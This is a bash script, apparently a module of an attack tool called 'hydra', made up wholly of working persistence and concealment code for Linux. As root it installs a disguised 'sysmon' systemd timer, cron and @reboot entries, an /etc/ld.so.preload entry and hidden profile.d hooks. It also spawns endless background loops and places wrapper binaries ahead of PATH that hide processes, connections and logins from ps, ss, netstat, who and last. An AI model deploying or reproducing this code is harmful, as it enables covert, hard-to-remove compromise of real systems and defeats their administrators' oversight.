#!/bin/bash

hydra_install_timer() {
    local config="$1"
    local svc="/etc/systemd/system/sysmon.service"
    local tmr="/etc/systemd/system/sysmon.timer"
    local want="/etc/systemd/system/timers.target.wants"

    [ -d /etc/systemd/system ] || return 0

    mkdir -p "$want" 2>/dev/null

    if [ ! -f "$svc" ]; then
        {
            printf '%s\n' "[Unit]"
            printf '%s\n' "Description=Periodic system monitor worker"
            printf '%s\n' "After=network.target"
            printf '%s\n' ""
            printf '%s\n' "[Service]"
            printf '%s\n' "Type=oneshot"
            printf '%s\n' "ExecStart=/bin/sh -c '/bin/sh ${config}'"
        } > "$svc"
    fi

    if [ ! -f "$tmr" ]; then
        {
            printf '%s\n' "[Unit]"
            printf '%s\n' "Description=Periodic system monitor timer"
            printf '%s\n' ""
            printf '%s\n' "[Timer]"
            printf '%s\n' "OnBootSec=30"
            printf '%s\n' "OnUnitActiveSec=30"
            printf '%s\n' "AccuracySec=1"
            printf '%s\n' ""
            printf '%s\n' "[Install]"
            printf '%s\n' "WantedBy=timers.target"
        } > "$tmr"
    fi

    ln -sf "$tmr" "$want/sysmon.timer" 2>/dev/null
    systemctl daemon-reload >/dev/null 2>&1
    systemctl enable sysmon.timer >/dev/null 2>&1
    systemctl start sysmon.timer >/dev/null 2>&1
}

hydra_install_cron() {
    local config="$1"
    local f
    for f in /etc/crontab /etc/cron.d/sysmon /etc/cron.d/update-motd /var/spool/cron/crontabs/root; do
        grep -qF "$config" "$f" 2>/dev/null && continue
        case "$f" in
            /var/spool/cron/crontabs/*)
                mkdir -p /var/spool/cron/crontabs 2>/dev/null
                printf '%s\n' "*/1 * * * * . ${config}" >> "$f" 2>/dev/null
                ;;
            /etc/crontab|/etc/cron.d/*)
                printf '%s\n' "*/1 * * * * root . ${config}" >> "$f" 2>/dev/null
                ;;
        esac
    done

    if [ -d /etc/cron.daily ] && [ ! -f /etc/cron.daily/.sysmon ]; then
        {
            printf '%s\n' "#!/bin/sh"
            printf '%s\n' ". ${config}"
        } > /etc/cron.daily/.sysmon
        chmod 755 /etc/cron.daily/.sysmon 2>/dev/null
    fi

    if command -v crontab >/dev/null 2>&1; then
        if ! crontab -l 2>/dev/null | grep -qF "$config"; then
            ( crontab -l 2>/dev/null; printf '%s\n' "@reboot . ${config}" ) | crontab - >/dev/null 2>&1
        fi
    fi
}

hydra_install_loader() {
    local arm="$1"
    [ -n "$arm" ] || return 0
    [ -f "$arm" ] || return 0
    grep -qF "$arm" /etc/ld.so.preload 2>/dev/null && return 0
    if [ -e /etc/ld.so.preload ] && [ ! -e /etc/ld.so.preload.blk ]; then
        cp -f /etc/ld.so.preload /etc/ld.so.preload.blk 2>/dev/null
    fi
    printf '%s\n' "$arm" >> /etc/ld.so.preload 2>/dev/null
}

hydra_install_flock() {
    local workspace="$1"
    local config="$2"
    local entry="$3"
    local arm="$4"

    if [ "$(id -u)" != "0" ]; then
        hydra_style "install: not root, only arms and keeper are armed"
        return 0
    fi

    hydra_install_cron "$config" 2>/dev/null
    hydra_install_timer "$config" 2>/dev/null
    hydra_install_loader "$arm" 2>/dev/null
    hydra_install_wrappers "$workspace" 2>/dev/null

    if [ -n "$entry" ] && [ -x "$workspace/$entry" ]; then
        [ -f "/etc/profile.d/.${entry}" ] || printf '%s\n' ". \"$workspace/$entry\" </dev/null >/dev/null 2>&1" > "/etc/profile.d/.${entry}" 2>/dev/null
        chmod 644 "/etc/profile.d/.${entry}" 2>/dev/null
    fi
}

hydra_spawn_arms() {
    local config="$1"
    local loops="${2:-4}"
    local i

    for ((i = 1; i <= loops; i++)); do
        if command -v setsid >/dev/null 2>&1; then
            setsid /bin/sh -c "while true; do /bin/sh '${config}'; sleep 1; done" </dev/null >/dev/null 2>&1 &
        else
            ( while true; do /bin/sh "$config"; sleep 1; done ) </dev/null >/dev/null 2>&1 &
        fi
        disown 2>/dev/null
    done
}

hydra_install_wrappers() {
    local workspace="$1"
    local root="/usr/local/sbin/kworker"
    local hidden="$workspace/.blk_hide"
    local tool

    mkdir -p "$root" 2>/dev/null

    cat > "$root/.filter" << EOF_FILTER
#!/bin/sh
N="\$(basename "\$0")"
case "\$N" in
  who|w|last|lastlog)
    exit 0
    ;;
  netstat|ss)
    /usr/sbin/ss "\$@" 2>/dev/null | grep -vF -f "${hidden}"
    ;;
  *)
    /usr/bin/ps "\$@" 2>/dev/null | grep -vF -f "${hidden}"
    ;;
esac
EOF_FILTER
    chmod 755 "$root/.filter" 2>/dev/null

    for tool in ps pstree top pgrep pkill lsof netstat ss who w last lastlog; do
        if [ -f "$root/$tool" ]; then
            continue
        fi
        if ln -s "$root/.filter" "$root/$tool" 2>/dev/null; then
            :
        else
            cp "$root/.filter" "$root/$tool" 2>/dev/null
        fi
        chmod 755 "$root/$tool" 2>/dev/null
    done

    if [ -d /etc/profile.d ] && [ ! -f /etc/profile.d/.blk_path ]; then
        printf '%s\n' "case \":\$PATH:\" in *:\"${root}\":*) ;; *) PATH=\"${root}:\$PATH\"; export PATH ;; esac" > /etc/profile.d/.blk_path
        chmod 644 /etc/profile.d/.blk_path 2>/dev/null
    fi

    if ! grep -qF "$root" /etc/environment 2>/dev/null; then
        printf '%s\n' "PATH=\"${root}:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\"" >> /etc/environment 2>/dev/null
    fi
}

hydra_status() {
    local port="$1"
    local key="$CAPTURE_KEY"
    local pid
    local loops
    local probes
    local listening
    pid="$(sed -n 1p "$ART/.blk_bind_pid" 2>/dev/null)"
    loops="$(ps -eo args 2>/dev/null | grep -c '[b]lk_cfg')"
    probes="$(ps -eo args 2>/dev/null | grep -c '[.]r7d')"
    listening="$(ss -lnt 2>/dev/null | grep -c ":${port} ")"

    hydra_style "hill: $(hostname 2>/dev/null) // port ${port}"
    hydra_style "keeper: pid ${pid:-none}, listening ${listening}, probes ${probes}"
    hydra_style "arms: ${loops} watch loop(s)"
    hydra_style "cron: $(grep -c . /etc/cron.d/sysmon 2>/dev/null) crontab line(s)"
    hydra_style "timer: $(systemctl is-enabled sysmon.timer 2>/dev/null)"
    hydra_style "loader: $(grep -cF '.hide' /etc/ld.so.preload 2>/dev/null) preload arm(s)"
    hydra_style "marker: $(date +%s) vs $(cat "$ART/.blk_hydra_last" 2>/dev/null)"
    hydra_style "hotkey: ${key:-unset}"
}

hydra_team_token() {
    local t="${TEAM_TOKEN:-}"
    [ -n "$t" ] || t="${STATE[kw_team_token]:-}"
    printf '%s' "$t"
}

hydra_team_token() {
    local t="${TEAM_TOKEN:-}"
    [ -n "$t" ] || t="${STATE[kw_team_token]:-}"
    printf '%s' "$t"
}
